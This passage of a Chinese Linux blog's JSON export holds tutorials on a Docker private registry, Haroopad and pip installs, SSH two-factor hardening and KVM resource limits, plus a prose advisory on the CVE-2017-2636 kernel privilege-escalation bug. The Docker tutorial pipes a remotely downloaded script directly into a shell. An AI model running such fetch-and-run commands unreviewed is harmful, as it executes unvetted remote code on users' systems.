http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname http://php.net/manual/en/function.mail.php https://tools.ietf.org/html/rfc5321 转自FreeBuf.com","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://blog.unixmen.cn/tags/WordPress/"}]},{"title":"Docker私有镜像仓库节点部署","slug":"Docker私有镜像仓库节点部署","date":"2017-05-02T09:42:29.000Z","updated":"2017-05-02T10:00:19.101Z","comments":true,"path":"2017/05/02/Docker私有镜像仓库节点部署/","link":"","permalink":"http://blog.unixmen.cn/2017/05/02/Docker私有镜像仓库节点部署/","excerpt":"","text":"关于本文本文简介生产环境中私有镜像仓库节点的部署及自定义环境配置。 硬件要求生产环境中要安装或升级容器私有镜像仓库节点，需要硬件必须满足下列要求： 最小 推荐 备注 CPU 1 core 大于4 core 内存 1 GB 大于32 GB 磁盘 5 GB 大于120 GB 小于 5GB 仍然可以安装，Docker 对磁盘需求较大，要确保 Docker 的 Graph Dir(/var/lib/docker) 在较大磁盘分区上 独立数据盘 RHEL/CentOS 需要 &gt; 5GB 独立数据盘 RHEL/CentOS 需要 &gt;30GB 独立数据盘 需要使用 devicemapper 的 direct-lvm 模式 网络 所有节点互通 所有节点互通, ping &lt;1ms 至少两块网卡 ##系统要求 系统推荐：CentOS 7.2 内核推荐：大于3.10 注：默认第一块网卡为内网 时间同步 安装ntpd服务 1yum install ntp 与上游ntp服务器进行时间同步 1ntpdate 10.154.88.88 配置ntp服务配置文件 1sed -i &apos;s/0.centos.pool.ntp.org iburst/10.154.88.88/g&apos; /etc/ntp.conf 启动ntpd服务 12systemctl enable ntpdsystemctl start ntpd 配置本地存储为方便后期维护管理，采用LVM对本地存储进行管理 创建PV 1pvcreate /dev/sdb 创建VG 1vgcreate data /dev/sdb 创建LV 1lvcreate -L 500G data -n docker_data 格式化新分区 1mkfs.xft /dev/data/docker_data ##系统更新 为了提供更稳定的基础环境，建议对宿主机的底层环境进行更新升级。1yum update -y ##安装容器服务 卸载系统默认（版本较老的）Docker环境包 12yum -y remove docker docker-common container-selinuxyum -y remove docker-selinux 配置官方软件仓库源 12yum install -y yum-utilsyum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 更新本地缓存 1yum makecache fast 查看软件包信息 1yum list docker-ce.x86_64 --showduplicates |sort -r 安装Docker engine社区版 1yum -y install docker-ce 本地容器服务配置 启动容器服务 1systemctl start docker 设置开机启动 1systemctl enable docker 设置容器数据存储路径 12345systemctl stop dockermv /var/lib/docker&#123;,.bak&#125;mkdir /var/lib/dockermount /dev/data/docker_data /var/lib/dockerecho &quot;/dev/data/docker_data /var/lib/docker xfs defaults 1 0&quot; &gt;&gt;/etc/fstab 配置加速器 1curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxxxxxxxxx.m.daocloud.io 启动容器服务 1systemctl start docker 测试运行实例 1docker run hello-world 创建私有镜像仓库镜像存放分区 创建LV 1lvcreate -L 2000G data -n registry_data 格式化新分区 1mkfs.xft /dev/data/registry_data 挂载新分区 1mount /dev/data/registry_data /data/docker/registry/ 修改系统启动挂载分区 1echo &quot;/dev/data/registry_data /data/registry_data xfs defaults 1 0&quot; &gt;&gt;/etc/fstab 启动私有镜像仓库registry 是Docker官方提供的私有镜像仓库工具，可以用于构建私有的镜像仓库 1docker run -d -p 5000:5000 -v /data/docker/registry/:/var/lib/registry registry:latest 私有镜像仓库测试 查看本地镜像1234[root@docker-registry ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEbusybox latest 00f017a8c2a6 2 weeks ago 1.11 MBregistry latest 047218491f8c 2 weeks ago 33.2 MB 可以看到，本机共有两个容器镜像，分别是：registry和busybox 重新标记一个本地镜像为私有仓库的版本，这里将本地的busybox标记为本地IP:5000/busybox 1docker tag busybox 10.82.2.103:5000/busybox 再次查看本地镜像再次查看镜像可以看到多了一个标记为10.82.2.103:5000/busybox的镜像 12345[root@docker-registry ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE10.82.2.103:5000/busybox latest 00f017a8c2a6 2 weeks ago 1.11 MBbusybox latest 00f017a8c2a6 2 weeks ago 1.11 MBregistry latest 047218491f8c 2 weeks ago 33.2 MB 将本地镜像推送到本地仓库中 1docker push 10.82.2.103:5000/busybox 推送过程 1234[root@docker-registry ~]# docker push 10.82.2.103:5000/busyboxThe push refers to a repository [10.82.2.103:5000/busybox]c0de73ac9968: Pushed latest: digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5 size: 527 查看本地仓库中的镜像列表 1curl 10.82.2.103:5000/v2/busybox/tags/list 结果如下：1&#123;&quot;name&quot;:&quot;busybox&quot;,&quot;tags&quot;:[&quot;latest&quot;]&#125; 删除本地busybox镜像 1234567[root@docker-registry ~]# docker rmi busyboxUntagged: busybox:latestUntagged: busybox@sha256:32f093055929dbc23dec4d03e09dfe971f5973a9ca5cf059cbfb644c206aa83f[root@docker-registry ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE10.82.2.103:5000/busybox latest 00f017a8c2a6 2 weeks ago 1.11 MBregistry latest 047218491f8c 2 weeks ago 33.2 MB 从私有仓库拉取镜像 12345[root@docker-registry ~]# docker pull 10.82.2.103:5000/busyboxUsing default tag: latestlatest: Pulling from busyboxDigest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5Status: Image is up to date for 10.82.2.103:5000/busybox:latest 可以看到成功获取私有仓库中的镜像 尝试从私有镜像仓库中拉取的镜像启动容器 123456[root@docker-registry ~]# docker run -i -t 10.82.2.103:5000/busybox / # hostname 11ea9195246f/ # hostid 11ac0300/ # 在其他容器计算节点上进行测试测试内容包括：拉取私有镜像仓库中的镜像、在容器计算节点上查看所拉取的镜像、从私有镜像仓库中拉取的镜像启动容器。 拉取私有镜像仓库中的镜像 123456[I] $ docker pull 10.82.2.103:5000/busyboxUsing default tag: latestlatest: Pulling from busybox04176c8b224a: Pull complete Digest: sha256:68effe31a4ae8312e47f54bec52d1fc925908009ce7e6f734e1b54a4169081c5Status: Downloaded newer image for 10.82.2.103:5000/busybox:latest 查看拉取的镜像 123456789[I] $ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZE10.82.2.103:5000/busybox latest 00f017a8c2a6 13 days ago 1.11 MBubuntu latest 4ca3a192ff2a 3 months ago 128.2 MBcentos latest 0584b3d2cf6d 4 months ago 196.5 MBregistry latest c9bd19d022f6 5 months ago 33.27 MB[I] $ sudo ip add |grep 192 inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25 inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0 从私有镜像仓库中拉取的镜像启动容器 12345678[I] $ sudo ip add |grep 192 inet 192.168.66.3/24 brd 192.168.66.255 scope global enp0s25 inet 192.168.66.4/24 brd 192.168.66.255 scope global wlp3s0[I] $ docker run -i -t 10.82.2.103:5000/busybox/ # hostname &amp;&amp;hostid4ed4430a0b8d11ac0200/ # 可以看到可以正常启动容器 至此，私有镜像仓库部署完成。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"},{"name":"Docker私有仓库","slug":"技术文档/Tools/容器/Docker私有仓库","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/Docker私有仓库/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器私有仓库配置","slug":"容器私有仓库配置","permalink":"http://blog.unixmen.cn/tags/容器私有仓库配置/"},{"name":"Docker私有仓库","slug":"Docker私有仓库","permalink":"http://blog.unixmen.cn/tags/Docker私有仓库/"}]},{"title":"Fedora安装Haroopad","slug":"Fedora安装Haroopad","date":"2017-05-02T08:59:14.000Z","updated":"2017-05-02T10:08:43.179Z","comments":true,"path":"2017/05/02/Fedora安装Haroopad/","link":"","permalink":"http://blog.unixmen.cn/2017/05/02/Fedora安装Haroopad/","excerpt":"","text":"简介Haroopad是一款跨平台的Markdown编辑器，在windows下，可下载安装包，通过安装想到进行安装。在Ubuntu/Mac OS下可载官方打包好的deb软件，通过包命令可以安装。然而在其他Linux系列版本下并没有对应的软件包，所以需要下载源码包进行安装；值得一提的是，Haroopad在所有平台下都区分32/64位版本。 介绍安装环境我的Fedora版本是23，Haroopad版本是0.13.1 64位（这也是截至今天最新的稳定版本）。 下载源码安装包：官方下载地址为： 1https://bitbucket.org/rhiokim/haroopad-download/downloads/haroopad-v0.13.1-x64.tar.gz 安装 将下载的软件包解压： 1tar -zxvf haroopad-v0.13.1-x64.tar.gz 再将解压出来的软件包解压： 1tar -zxvf data.tar.gz 将解压出来的文件复制到根目录 1cp -rv ./usr / 将另一个软件包也解压出来 1tar -zxvf control.tar.gz 将从control.tar.gz 中解压出来的文件添加可行权限 1chmod 755 postinst 运行postinst 1./postinst 创建“.desktop” 文件使用以下命令创建“.desktop” 文件 12345678910111213cat &gt;/usr/share/applications/Haroopad.desktop&lt;&lt;EOF[Desktop Entry]Name=haroopadVersion=0.13.1Exec=haroopadComment=The Next Document processor based on MarkdownIcon=haroopadType=ApplicationTerminal=falseStartupNotify=trueEncoding=UTF-8Categories=Development;GTK;GNOME;EOF 复制Hroopad 图标文件：1cp -rf usr/share/icons/hicolor/ /usr/share/icons/hicolor 至此Hroopad安装完成。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"Haroopad","slug":"技术文档/Tools/Haroopad","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/Haroopad/"}],"tags":[{"name":"Haroopad","slug":"Haroopad","permalink":"http://blog.unixmen.cn/tags/Haroopad/"},{"name":"标记语言","slug":"标记语言","permalink":"http://blog.unixmen.cn/tags/标记语言/"}]},{"title":"如何在Fedora中安装pip2或pip3","slug":"如何在Fedora中安装pip2或pip3","date":"2017-05-02T03:24:19.000Z","updated":"2017-05-02T10:11:04.398Z","comments":true,"path":"2017/05/02/如何在Fedora中安装pip2或pip3/","link":"","permalink":"http://blog.unixmen.cn/2017/05/02/如何在Fedora中安装pip2或pip3/","excerpt":"","text":"文章简介pip 是一个简单易用的python包管理工具。本文简要介绍pip2及pip3 的两种安装方式，当然pip2和pip3在同一套系统中pip3 跟pyhon一样，2版本和3版本是可以并存的。 安装pip 首先我们清空我们系统中残留冗余包。 1dnf clean all 作为最佳体验，我们升级系统软件包 1dnf update -y 现在可以安装pip工具包了pip2使用以下命令进行安装：1dnf -y install python-pip 也可以通过以下方式进行安装1python -m pip install -U pip pip3使用以下命令进行安装：1dnf -y install python3-pip 也可以通过以下方式进行安装1python3 -m pip install -U pip 验证：pip安装完成后，我们可以进行验证是否正确了安装成功，具体操作如下： 首先可以获取帮助文档 如果仅仅pip2或着pip3可以通过以下命令进行验证： 1pip --help 假如系统中同时安装了pip2和pip3 就要制定pip命令版本进行验证： 如查看pip3的帮助文档： 1pip3 --help 查看pip3的帮助文档 1pip2 --help 其次还可以获取版本信息： pip2 1pip2 -V pip3 1pip3 -V 你pip -V 命令将获取类似如下结果： 1pip 9.0.1 from /usr/lib/python2.7/site-packages (python 2.7)","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"Python","slug":"技术文档/Tools/Python","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/Python/"},{"name":"pip","slug":"技术文档/Tools/Python/pip","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/Python/pip/"}],"tags":[{"name":"pip","slug":"pip","permalink":"http://blog.unixmen.cn/tags/pip/"},{"name":"python","slug":"python","permalink":"http://blog.unixmen.cn/tags/python/"}]},{"title":"SSH安全加固篇-通过运维密码实现Linux系统SSH双因子认证","slug":"通过运维密码实现Linux系统SSH双因子认证","date":"2017-03-29T00:38:24.000Z","updated":"2017-03-29T03:21:56.094Z","comments":true,"path":"2017/03/29/通过运维密码实现Linux系统SSH双因子认证/","link":"","permalink":"http://blog.unixmen.cn/2017/03/29/通过运维密码实现Linux系统SSH双因子认证/","excerpt":"","text":"通过运维密码实现Linux系统SSH双因子认证关于本文本文讲述了如果通过Linux.中国提供的微信小程序”运维密码”结合 Google身份验证器”Google Authenticator“实现Linux系统OpenSSH双因子认证对SSH进行安全加固。 前言/背景近来很多知名企业都出现了密码泄露，业内对多重认证的呼声也越来越高。 双因子认证 什么是双因子认证 双因子认证（Two-factor authentication，也叫2FA），是一种通过组合两种不同的验证方式进行用户身份验证的机制。 在这种多重认证的系统中，用户需要通过两种不同的认证程序： 提供他们知道的信息（如 用户名/密码） 再借助其他工具提供用户所不知道的信息（如用手机生成的一次性密码） SSH双因子认证实现思路使用“运维密码”结合“Google身份验证器”及Linux系统“OpenSSH”双因子认证对SSH进行安全加固。 关于Google 身份验证器 为了鼓励广泛采用双因子认证的方式，Google 公司发布了 Google 身份验证器Google Authenticator，一款开源的，可基于开放规则（如 HMAP/ 基于时间）生成一次性密码的软件。这是一款跨平台软件，可运行在 Linux、 Android、 iOS。Google 公司同时也支持插件式鉴别模块PAM （pluggable authentication module），使其能和其他也适用 PAM 进行验证的工具（如 OpenSSH）协同工作。 关于运维密码 Linux.中国社区长期接触互联网新技术的最前沿，洞察大势所趋，身兼新技术广泛传播及维护互联网安全的重任，以及方便运维及新技术的传播开发了运维密码小程序。 如何开始首先我们需要一些准备工作： 一台运行着 OpenSSH 服务版本大于6.2的 Linux 主机 一台能运行微信的智能手机 一台支持SSH登陆的终端 在 Linux 系统中安装 Google 身份验证器第一步需要在运行着 OpenSSH 服务的 Linux 主机上安装 Google 身份验证器。按照如下步骤安装 Google 身份验证器及其PAM模块。 用安装包安装 Google 身份验证器如果你不想自己构建 Google 身份验证器，在几个 Linux 发行版上有已经编译好的安装包。安装包里面包含 Google 身份验证器 二进制程序和 PAM 模块。 在 Ubuntu 上安装 Google 身份验证器： 12sudo apt-get install libpam-google-authenticator 在 Fedora 上安装 Google 身份验证器： 12sudo dnf install google-authenticator 在 CentOS 上安装 Google 身份验证器： 在 CentOS 上安装 Google 身份验证器 ，需要首先启用 EPEL 软件库，然后运行如下命令： 12sudo yum install google-authenticator 编译安装 Google 身份验证器首先，安装构建 Google 身份验证器所需的软件包。 在 Debian、 Ubuntu 或 Linux Mint 上： 12sudo apt-get install wget make gcc libpam0g-dev 在 CentOS、 Fedora 或 RHEL上： 12sudo yum install wget make gcc pam-devel 然后下载 Google 身份验证器的源代码 12git clone https://github.com/google/google-authenticator.git 编译安装Google 身份验证器： 12345678cd google-authenticator/libpam./bootstrap.sh./configuremake 如果构建成功，你会在目录中看到 pam_google_authenticator.so 和 google-authenticator 两个文件。 最后，将 Google 身份验证器安装到合适位置。默认会安装到 /usr/local/lib/security 下，根据你的系统不同，你可能需要将其符号链接到 pam 库的位置（比如 CentOS 7 会在 /usr/lib64/security）。如下图所示： 12sudo make install 至此，Google 身份验证器安装完成。 配置Google 身份验证器及运维密码完成Google 身份验证器的安装我们仅仅完成了第一步，接着需要对Google 身份验证器、运维密码、SSH进行配置才能达到我们预期的效果。 配置google-authenticator及生成验证密钥 使用（以下）命令生成验证密钥 12google-authenticator 生成验证密钥的时候，会再次确认信息。 12Do you want authentication tokens to be time-based (y/n) 意思是：你想要生产基于时间生成验证码吗？这里需要需要输入y 输入y之后你将看到一个二维码，它使用如下二维码图形格式表示我们数字形态的密钥。注：一会我们要用到它在运维密码上完成配置。 紧急验证码在生成密钥的同时还生成了5个8位的紧急密码，当然，也是一次性使用的，请妥善保存，以备不时之需。 保存Google Authenticator配置文件 Google Authenticator 虽然运行了，但是相关设置还没有保存，接下来会提示保存： 意思是：你想将配置文件写入到“/root/.google_authenticator”保存吗？ 12Do you want me to update your &quot;/root/.google_authenticator&quot; file? (y/n) 输入y回车 禁止同一令牌多用途登陆 意思是：你是否要禁用同一密钥多用途登陆，这将限制你每30秒只能登陆一次，这将增加接收提醒的机会，甚至能够防止中间人攻击。 123456 Do you want to disallow multiple uses of the same authenticationtoken? This restricts you to one login about every 30s, but it increasesyour chances to notice or even prevent man-in-the-middle attacks (y/n) 输入y回车 时间容错设置 意思是:默认情况下，密钥在30秒内有效，为了防止由于客户端与服务器时间偏移（时间相差太大）导致认证失败，google authenticator设计时间容错措施。 1234567891011121314 By default, tokens are good for 30 seconds. In order to compensate forpossible time-skew between the client and the server, we allow an extratoken before and after the current time. If you experience problems withpoor time synchronization, you can increase the window from its defaultsize of +-1min (window size of 3) to about +-4min (window size of17 acceptable tokens).Do you want to do so? (y/n) 这个可根据实际情况进行配置。 暴力破解防护 意思是：在你的电脑存在暴力破解的情况下可开启身份认证次数限制模块，默认限制为：30秒内不超过三次登陆尝试。 12345678 If the computer that you are logging into isn&apos;t hardened against brute-forcelogin attempts, you can enable rate-limiting for the authentication module.By default, this limits attackers to no more than 3 login attempts every 30s.Do you want to enable rate-limiting (y/n) 输入y回车 配置完成 配置完成后会在home目录下生成一个权限为400的隐藏文件，如下图所示： 配置运维密码 打开微信小程序 打开微信，依次点击发现，小程序 输入“运维密码”并搜索 点击“运维密码”进入应用 点击右下角二维码图标 扫一扫配置google-authenticator时所生成的二维码 点击确定添加场景 添加完成 配置SSH服务 添加认证模块 在/etc/pam.d/sshd文件添加认证模块 12echo &quot;auth required pam_google_authenticator.so&quot; &gt;&gt;/etc/pam.d/sshd 配置任何的密码认证 12sed -i &apos;s/ChallengeResponseAuthentication no/ChallengeResponseAuthentication yes/g&apos; /etc/ssh/sshd_config 重启sshd服务 12systemctl restart sshd.service 测试登陆以上配置完成基本上就搞定了，下面我们进行测试。 登陆测试 输入命令登陆主机 12ssh root@10.112.2.3 首先输入服务器的密码,接着会让输入运维密码。 运维密码可在小程序中查看。 如下图： 我们可以看到，在登陆的时候，需要配合“运维密码”才能登陆服务器。 公钥登陆测试 如果使用公钥登陆呢？以上配置是不是也是需要配合运维密码才能登陆的，我们进行验证： 首先，我们将本机的公钥复制到远程机器的authorized_keys文件中。 12ssh-copy-id root@10.112.2.3 登陆测试 我们可以看到，不需要输入任何密码，直接登陆到了系统。 结合运维密码配置增强型SSH安全选项针对上面公钥登陆的测试，如果还任我不是很安全，我们可以设定如下登陆场景：公钥+密码+运维密码，我们需要如何做呢？ 配置SSH公钥双因子 修改/etc/ssh/sshd_config配置文件 12echo &quot;AuthenticationMethods publickey,keyboard-interactive:pam&quot; &gt;&gt;/etc/ssh/sshd_config 重启SSH服务 12systemctl restart sshd.service 登陆测试 12ssh root@10.112.2.3 可以看到，登陆的时候是需要验证公钥，密码，及输入运维密码才能登陆到系统。 没有密钥的情况下尝试登陆测试,如下图 至此，本文结束，如有错误及不足欢迎指正。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"安全","slug":"技术文档/Tools/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/安全/"}],"tags":[{"name":"双因子认证","slug":"双因子认证","permalink":"http://blog.unixmen.cn/tags/双因子认证/"},{"name":"SSH安全加固","slug":"SSH安全加固","permalink":"http://blog.unixmen.cn/tags/SSH安全加固/"},{"name":"运维密码","slug":"运维密码","permalink":"http://blog.unixmen.cn/tags/运维密码/"}]},{"title":"潜伏7年的Linux内核漏洞CVE-2017-2636 ,可本地提权","slug":"潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权","date":"2017-03-20T02:00:55.000Z","updated":"2017-03-20T02:55:33.784Z","comments":true,"path":"2017/03/20/潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权/","link":"","permalink":"http://blog.unixmen.cn/2017/03/20/潜伏7年的Linux内核漏洞CVE-2017-2636-可本地提权/","excerpt":"","text":"漏洞描述又一个古老的Linux内核漏洞被曝光！ 漏洞编号：CVE-2017-2636漏洞发现者：Alexander Popov漏洞危害：高危，(CVSS v3标准漏洞,评分为7.8), 低权限用户利用该漏洞可以在Linux系统上实现本地提权。影响范围：这个bug最早引入在2009年6月22号。在该日期发布后的内核版本均可能受该漏洞影响。详情请参看https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=be10eb7589337e5defbe214dae038a53dd21add8 漏洞简述：该漏洞是Linux内核驱动 n_hdlc 模块(drivers/tty/n_hdlc.c)发生条件竞争导致的，。 Positive Technologies的研究员Alexander Popov发现了存在于N_HLDC linux内核驱动的竞争条件问题。这个内核驱动负责处理高级数据链路控制（High-Level Data Link Control或简称HDLC）数据。问题导致了double-free漏洞。利用该漏洞可以进行权限提升。该驱动模块提供HDLC串行线路规则，在大多Linux发行版的内核配置为CONFIG_N_HDLC = m，n_hdlc被编译成模块并启用。 Double Free其实就是同一个指针free两次。虽然一般把它叫做double free，其实只要是free一个指向堆内存的指针都有可能产生可以利用的漏洞。 “这是CVE-2017-2636的声明，该漏洞即N_HLDC (drivers/tty/n_hdlc.c) linux内核驱动中的竞争条件。这个漏洞可以用来进行本地提权。”SecList的安全公告提到。“该驱动提供HDLC串行线路规程，这是很多linux发行版中的内核模块——只要是内核设置中有CONFIG_N_HDLC=m的linux发行版。要利用这个漏洞不需要Microgate或者SyncLink硬件。当没有权限的用户打开伪终端并且调用TIOCSETD ioctl函数设置HDLC串行线路规程的时候，模块就会自动加载。” 因此未经授权的攻击者可以利用这个漏洞注入执行任意代码。 影响范围 这个漏洞影响的范围涵盖大多数主流的Linux发行版，包括Red Hat Enterprise Linux 6, 7, Fedora, SUSE, Debian和Ubuntu。 由于漏洞可以追溯至2009年7月，那些Linux设备存在漏洞长达7年了，但是根据Positive Technologies的调查，很难确定漏洞是否已经被利用过。 “漏洞非常老，所以在Linux工作站和服务器中传播广泛。”Popov说道，“要想利用漏洞，攻击者只需要没有权限的普通用户就行了。另外，攻击不需要任何特殊的硬件。” 研究人员在用syzkaller fuzzer进行系统调用测试的时候发现了这个漏洞。syzkaller fuzzer是由Google开发的代码安全审计软件。 Popov于是在2017年2月28日将漏洞细节、exp原型和补丁上报给了kernel.org。Popov称会在之后公布PoC。 修复建议 该漏洞目前已经修复，更新和漏洞详情均在3月7日公布。建议用户尽快下载安全更新。如果暂时无法安装更新，建议手动关闭n_hdlc模块。 Linux各发行版本对于该漏洞相关信息Red Hat Enterprise Linux/CentOShttps://access.redhat.com/security/cve/CVE-2017-2636 Debianhttps://security-tracker.debian.org/tracker/CVE-2017-2636 ubuntuhttps://people.canonical.com/~ubuntu-security/cve/2017/CVE-2017-2636.html SUSE/openSUSEhttps://www.suse.com/security/cve/CVE-2017-2636.html","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"KVM 实例资源限制","slug":"KVM实例资源限制","date":"2017-03-08T10:32:46.000Z","updated":"2017-03-08T10:35:56.106Z","comments":true,"path":"2017/03/08/KVM实例资源限制/","link":"","permalink":"http://blog.unixmen.cn/2017/03/08/KVM实例资源限制/","excerpt":"","text":"KVM生产环境一般情况下都是对KVM环境及内核等进行优化从而达到KVM实例发挥最优性能，但某些特定场景也会对实例进行资源限制。以下分享如何控制实例的资源使用，对实例使用资源进行控制。 一、磁盘资源的控制对磁盘的资源限制可使用blkiotune来实现。 使用blkiotune对磁盘进行限制有两种方式： 设置实例的权重 限制磁盘的IOPS 命令行格式：1blkiotune &lt;domain&gt; [--weight &lt;number&gt;] [--device-weights &lt;string&gt;] [--device-read-iops-sec &lt;string&gt;] [--device-write-iops-sec &lt;string&gt;] [--device-read-bytes-sec &lt;string&gt;] [--device-write-bytes-sec &lt;string&gt;] [--config] [--live] [--current] 参数如下：123456789--total-bytes-sec &lt;number&gt; total throughput limit in bytes per second--read-bytes-sec &lt;number&gt; read throughput limit in bytes per second--write-bytes-sec &lt;number&gt; write throughput limit in bytes per second--total-iops-sec &lt;number&gt; total I/O operations limit per second--read-iops-sec &lt;number&gt; read I/O operations limit per second--write-iops-sec &lt;number&gt; write I/O operations limit per second--config affect next boot--live affect running domain--current affect current domain 设置磁盘的权重磁盘的权重数值范围在100-1000。 示例：设置虚拟机的权重为700，并立即生效。1virsh blkiotune 25 --weight 700 --live 实例xml配置为：123&lt;blkiotune&gt;&lt;weight&gt;700&lt;/weight&gt;&lt;/blkiotune&gt; 限制磁盘IOPS使用blkdeviotune限制读写速度和IOPS 示例：限制读写（吞吐量）及IOPS1virsh blkdeviotune netb2c vda --read-bytes-sec 4096 --write-bytes-sec 2048 --read-iops-sec 15 --write-iops-sec 15 --live 实例xml配置为： 123456&lt;iotune&gt; &lt;read_bytes_sec&gt;4096&lt;/read_bytes_sec&gt; &lt;write_bytes_sec&gt;2048&lt;/write_bytes_sec&gt; &lt;read_iops_sec&gt;15&lt;/read_iops_sec&gt; &lt;write_iops_sec&gt;15&lt;/write_iops_sec&gt;&lt;/iotune&gt; 实测结果读写总和（读写速度、IOPS）与读写（读写速度、IOPS）同时只能设置一个 列举guest块设备列表 12virsh domblklist wpftestvda /home1/wpf/ubuntu-14-04-test.qcow2 设定guest读/写IOPS 1virsh blkdeviotune wpftest vda --read-iops-sec 300 --write-iops-sec 300 获取当前IOPS限制 1234567virsh blkdeviotune wpftest vdatotal_bytes_sec: 0read_bytes_sec : 0write_bytes_sec: 0total_iops_sec : 0read_iops_sec : 300write_iops_sec : 300 二、网卡的资源控制网卡的资源限制可在添加网卡是进行限制，以及对已有的网卡进行限制两种资源限制效果上没有区别，可按需选择。 添加网卡时对网卡带宽进行限制命令行格式为：1attach-interface &lt;domain&gt; &lt;type&gt; &lt;source&gt; [&lt;target&gt;] [&lt;mac&gt;] [&lt;script&gt;] [&lt;model&gt;] [--persistent] [&lt;inbound&gt;] [&lt;outbound&gt;] 命令行参数：12345678910[--domain] &lt;string&gt; domain name, id or uuid[--type] &lt;string&gt; network interface type[--source] &lt;string&gt; source of network interface[--target] &lt;string&gt; target network name[--mac] &lt;string&gt; MAC address[--script] &lt;string&gt; script used to bridge network interface[--model] &lt;string&gt; model type--persistent persist interface attachment[--inbound] &lt;string&gt; control domain&apos;s incoming traffics[--outbound] &lt;string&gt; control domain&apos;s outgoing traffics 对已有网卡进行带宽限制 命令格式为： 1domiftune &lt;domain&gt; &lt;interface&gt; [--inbound &lt;string&gt;] [--outbound &lt;string&gt;] [--config] [--live] [--current] 参数为： 1234567[--domain] &lt;string&gt; domain name, id or uuid[--interface] &lt;string&gt; interface device (MAC Address)--inbound &lt;string&gt; control domain&apos;s incoming traffics--outbound &lt;string&gt; control domain&apos;s outgoing traffics--config affect next boot--live affect running domain--current affect current domain 实例xml配置为 1234&lt;bandwidth&gt;&lt;inbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;&lt;outbound average=&apos;1000&apos; peak=&apos;50&apos; burst=&apos;64&apos;/&gt;&lt;/bandwidth&gt; 注：单位kilobytes 实测结果Libvirt实际也是使用TC，因为TC只能限制流出方向流量，不能限制流入方向，所以通过Libvirt限制流量，实际也只能限制流出方向。 列举guest网卡列表： 1234virsh domiflist netb2cInterface Type Source Model MAC-------------------------------------------------------vnet44 network default rtl8139 52:54:00:4a:61:6a 设定带宽限制 1virsh domiftune wpftest 52:54:00:3b:e2:a5 --inbound 1000 --outbound 1000 --live 查看当前网卡带宽限制 1234567virsh domiftune netb2c vnet44inbound.average: 1000inbound.peak : 0inbound.burst : 0outbound.average: 1000outbound.peak : 0outbound.burst : 0 注：资源限制过程中，–interface可以是MAC地址也可以是设备名字，生产环境最好使用MAC地址进行限制。 三、CPU资源的控制对于CPU的资源控制可对实例CPU的权重进行调整，优化可对vcpu与cpu物理核心进行绑定已提升性能及减少宿主机的CPU压力。 命令行格式：1schedinfo &lt;domain&gt; [--weight &lt;number&gt;] [--cap &lt;number&gt;] [--current] [--config] [--live] [[--set] &lt;string&gt;].. 参数：1234567[--domain] &lt;string&gt; domain name, id or uuid--weight &lt;number&gt; weight for XEN_CREDIT--cap &lt;number&gt; cap for XEN_CREDIT--current get/set current scheduler info--config get/set value to be used on next boot--live get/set value from running domain[--set] &lt;string&gt; parameter=value 实例xml配置为1234567891011121314&lt;domain&gt;&lt;cputune&gt;&lt;vcpupin vcpu=&quot;0&quot; cpuset=&quot;1-4,^2&quot;/&gt;&lt;vcpupin vcpu=&quot;1&quot; cpuset=&quot;0,1&quot;/&gt;&lt;vcpupin vcpu=&quot;2&quot; cpuset=&quot;2,3&quot;/&gt;&lt;vcpupin vcpu=&quot;3&quot; 